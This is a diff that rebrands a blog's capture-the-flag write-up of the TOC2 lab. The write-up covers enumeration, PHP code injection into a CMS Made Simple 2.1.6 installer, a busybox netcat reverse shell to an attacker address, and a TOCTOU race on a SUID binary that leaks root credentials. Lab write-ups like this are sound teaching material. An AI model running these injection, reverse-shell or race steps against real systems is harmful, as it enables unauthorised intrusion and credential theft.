@@ -3,10 +3,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TOCTOU CTF Writeup | Minimalist Portfolio</title>
-<link rel="stylesheet" href="/gooduck/assets/css/style.css">
+  <title>TOCTOU CTF Writeup | Berc0de</title>
+<link rel="stylesheet" href="/bercode/assets/css/style.css">
 
-<link rel="stylesheet" href="/gooduck/assets/css/posts.css">
+<link rel="stylesheet" href="/bercode/assets/css/posts.css">
 
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
@@ -20,17 +20,17 @@
 
   <header class="header-navbar">
     <div class="header-inner">
-       <div class="logo-quack-wrap">
+       <div class="logo-rawr-wrap">
                   <div class="logo">
-                    <span class="quack-text">QUACK</span>
-                    Gooduck
+                    <span class="rawr-text">rawr</span>
+                    Berc0de
                   </div>
                 </div>
       <nav class="nav-links">
-        <a href="/gooduck/#home">Home</a>
-        <a href="/gooduck/#experience">Experience</a>
-        <a href="/gooduck/#certifications">Certifications</a>
-        <a href="/gooduck/write-ups.html" class="active">Write-ups</a>
+        <a href="/bercode/#home">Home</a>
+        <a href="/bercode/#experience">Experience</a>
+        <a href="/bercode/#certifications">Certifications</a>
+        <a href="/bercode/write-ups.html" class="active">Write-ups</a>
       </nav>
       <div class="social-links">
         <a href="https://github.com/yourusername" target="_blank"><i class="fab fa-github"></i></a>
@@ -68,14 +68,14 @@
   <li>Port 80: HTTP (Web Server)</li>
 </ul>
 
-<div class="post-img"><img src="/gooduck/assets/img/toc2/nmap.png" alt="TOC2 nmap" /></div>
+<div class="post-img"><img src="/bercode/assets/img/toc2/nmap.png" alt="TOC2 nmap" /></div>
 
 <h2 id="2-web-discovery--directory-bruteforcing">2. Web Discovery &amp; Directory Bruteforcing</h2>
 <p>Navigating to the website, we find an “Under Construction” page. While it mentions some potential credentials, their application isn’t immediately clear. To uncover hidden paths, I ran gobuster for directory bruteforcing.</p>
 
-<div class="post-img"><img src="/gooduck/assets/img/toc2/website_username_pass.png" alt="TOC2 website username pass" /></div>
+<div class="post-img"><img src="/bercode/assets/img/toc2/website_username_pass.png" alt="TOC2 website username pass" /></div>
 
-<div class="post-img"><img src="/gooduck/assets/img/toc2/gobuster.png" alt="TOC2 gobuster" /></div>
+<div class="post-img"><img src="/bercode/assets/img/toc2/gobuster.png" alt="TOC2 gobuster" /></div>
 
 <p>The scan identifies a <strong>robots.txt</strong> file. Inspecting its contents reveals an interesting installation path:</p>
 
@@ -83,7 +83,7 @@
   <li><strong>hxxp[://]10.48.164.165/cmsms/cmsms-2.1.6-install.php</strong></li>
 </ul>
 
-<div class="post-img"><img src="/gooduck/assets/img/toc2/robots.png" alt="TOC2 robots" /></div>
+<div class="post-img"><img src="/bercode/assets/img/toc2/robots.png" alt="TOC2 robots" /></div>
 
 <h2 id="3-vulnerability-research">3. Vulnerability Research</h2>
 <p>The discovered directory leads to the CMS Made Simple 2.1.6 installation wizard. Researching known vulnerabilities for this version leads to EDB-ID: 44192.</p>
@@ -97,7 +97,7 @@
 <h2 id="4-exploitation--initial-access">4. Exploitation &amp; Initial Access</h2>
 <p>Using the database credentials found during the installation steps, I injected a PHP system() function into the timezone field.</p>
 
-<div class="post-img"><img src="/gooduck/assets/img/toc2/exploit.png" alt="TOC2 exploit" /></div>
+<div class="post-img"><img src="/bercode/assets/img/toc2/exploit.png" alt="TOC2 exploit" /></div>
 
 <p>To verify the exploit, I accessed the newly created config.php with a command parameter</p>
 
@@ -105,7 +105,7 @@
   <li><strong>hxxp[://]10.48.164.165/cmsms/config.php?cmd=id</strong></li>
 </ul>
 
-<div class="post-img"><img src="/gooduck/assets/img/toc2/id_exploit.png" alt="TOC2 id exploit" /></div>
+<div class="post-img"><img src="/bercode/assets/img/toc2/id_exploit.png" alt="TOC2 id exploit" /></div>
 
 <h2 id="5-gaining-a-reverse-shell">5. Gaining a Reverse Shell</h2>
 <p>With RCE confirmed, the next step is to catch a reverse shell. I started a netcat listener on my local machine and executed the following payload via the browser</p>
@@ -114,7 +114,7 @@
   <li><strong>busybox%20nc%2010.48.83.150%204444%20-e%20%2Fbin%2Fbash</strong></li>
 </ul>
 
-<div class="post-img"><img src="/gooduck/assets/img/toc2/reverse_shell.png" alt="TOC2 reverse shell" /></div>
+<div class="post-img"><img src="/bercode/assets/img/toc2/reverse_shell.png" alt="TOC2 reverse shell" /></div>
 
 <p>Shell Stabilization
 Once connected, I stabilized the shell to allow for better interactivity. I followed the methods outlined in this guide:</p>
@@ -128,9 +128,9 @@ Once connected, I stabilized the shell to allow for better interactivity. I foll
 
 <p>Inside, we find <strong>user.txt</strong> (the first flag) and a file named <strong>new_machine.txt</strong>. The note explains that Frank was assigned a new Thinkpad and reveals a “default password” used for work machines. Using these credentials, I switched users to Frank</p>
 
-<div class="post-img"><img src="/gooduck/assets/img/toc2/frank.png" alt="TOC2 frank" /></div>
-<div class="post-img"><img src="/gooduck/assets/img/toc2/frank_pass.png" alt="TOC2 frank pass" /></div>
-<div class="post-img"><img src="/gooduck/assets/img/toc2/eleavate_frank.png" alt="TOC2 elevate frank" /></div>
+<div class="post-img"><img src="/bercode/assets/img/toc2/frank.png" alt="TOC2 frank" /></div>
+<div class="post-img"><img src="/bercode/assets/img/toc2/frank_pass.png" alt="TOC2 frank pass" /></div>
+<div class="post-img"><img src="/bercode/assets/img/toc2/eleavate_frank.png" alt="TOC2 elevate frank" /></div>
 
 <h2 id="7-privilege-escalation-toctou-attack">7. Privilege Escalation: TOCTOU Attack</h2>
 <p>In Frank’s home directory is a folder named root_access containing a SUID binary called <strong>readcreds</strong> and its source code, <strong>readcreds.c</strong>.</p>
@@ -146,16 +146,16 @@ Once connected, I stabilized the shell to allow for better interactivity. I foll
   </li>
 </ul>
 
-<div class="post-img"><img src="/gooduck/assets/img/toc2/setup_toctou.png" alt="TOC2 setup toctou" /></div>
+<div class="post-img"><img src="/bercode/assets/img/toc2/setup_toctou.png" alt="TOC2 setup toctou" /></div>
 
 <p>By rapidly swapping a file I could read with the root password backup file between the program’s “check” and “read” actions, I successfully retrieved the Root Credentials.</p>
 
-<div class="post-img"><img src="/gooduck/assets/img/toc2/root_creds.png" alt="TOC2 root creds" /></div>
+<div class="post-img"><img src="/bercode/assets/img/toc2/root_creds.png" alt="TOC2 root creds" /></div>
 
 <h2 id="8-final-flag">8. Final Flag</h2>
 <p>With the root password, I logged in as root and captured the final flag.</p>
 
-<div class="post-img"><img src="/gooduck/assets/img/toc2/roottxt.png" alt="TOC2 roottxt" /></div>
+<div class="post-img"><img src="/bercode/assets/img/toc2/roottxt.png" alt="TOC2 roottxt" /></div>
 
     </main>
   </div>
